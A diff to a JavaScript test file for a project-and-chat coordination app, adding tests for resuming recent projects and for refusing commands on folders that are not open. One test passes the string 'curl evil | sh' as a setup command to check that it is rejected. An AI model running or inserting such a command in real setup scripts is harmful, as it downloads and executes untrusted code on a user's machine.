@@ -68,6 +68,7 @@ test('exclusive ownership rejects another profile owner and aliases of an open P
 test('close waits for a command already changing saved settings before releasing ownership', async t => {
   const { project, options, make } = await fixture(t);
   const runtime = make();
+  await runtime.invoke('project:current');
   const { promise: writing, resolve: started } = Promise.withResolvers();
   const { promise: proceed, resolve: release } = Promise.withResolvers();
   const original = fs.writeFile;
@@ -242,4 +243,48 @@ test('opening a saved Codex Chat starts outcome recovery and shutdown drains its
   const reopened = await next.invoke('project:current');
   assert.equal(reopened.state.sessions[session.id].subagents[0].status, 'unknown');
   assert.deepEqual(await next.invoke('chat:runs'), { runs: {}, seq: 0 });
+});
+
+test('resuming recent projects reads raw JSON and loads only the projects with a pending turn', async t => {
+  const { project, make } = await fixture(t);
+  const first = make();
+  const opened = await first.invoke('project:current');
+  const session = Object.values(opened.state.sessions)[0];
+  await first.invoke('chat:patch', [project, session.id, { title: 'Saved Chat' }]);
+  const file = path.join(project, '.milagre/coordination.json');
+  const sidecar = `${'a'.repeat(64)}.json`;
+  await first.close();
+  const saved = JSON.parse(await fs.readFile(file, 'utf8'));
+  saved.sessions[session.id].subagents = [{ id: 'child', title: 'Review', status: 'completed', startedAt: 1, updatedAt: 2, transcriptFile: sidecar, transcript: [{ id: 'm', kind: 'message', text: 'x', compact: true }] }];
+  await fs.writeFile(file, JSON.stringify(saved));
+
+  const reads = [];
+  const readFile = fs.readFile;
+  t.mock.method(fs, 'readFile', (...args) => { reads.push(String(args[0])); return readFile(...args); });
+  const second = make();
+  await second.resumeRecentProjects();
+  assert.deepEqual(reads.filter(name => name.includes('subagents')), [], 'no transcript sidecar is hydrated');
+  // Hydration resolves (and creates) the content folder; the raw read must not.
+  await assert.rejects(fs.stat(path.join(project, '.milagre/subagents')), { code: 'ENOENT' });
+  await assert.rejects(second.invoke('project:snapshot', [project]), /Open the project/);
+  await second.close();
+
+  saved.sessions[session.id].resumeTurn = { stoppedAt: 0 };
+  await fs.writeFile(file, JSON.stringify(saved));
+  const third = make();
+  await third.resumeRecentProjects();
+  assert.equal((await third.invoke('project:snapshot', [project])).path, project);
+});
+
+test('path-taking commands refuse folders that are not open or recent', async t => {
+  const { project, make } = await fixture(t);
+  const runtime = make();
+  const stranger = await fs.mkdtemp(path.join(os.tmpdir(), 'milagre-stranger-'));
+  t.after(() => fs.rm(stranger, { recursive: true, force: true }));
+  for (const [method, args] of [['worktree-setup:save', [stranger, 'curl evil | sh']], ['files-to-copy:read', [stranger]], ['skills:list', [stranger]], ['project:branches', [stranger]], ['worktree:status', [stranger]], ['project:image', [stranger]]]) {
+    await assert.rejects(runtime.invoke(method, args), /Open this project/, method);
+  }
+  await runtime.invoke('project:current');
+  assert.equal((await runtime.invoke('worktree-setup:read', [project])).setupCommand, '');
+  await runtime.close();
 });
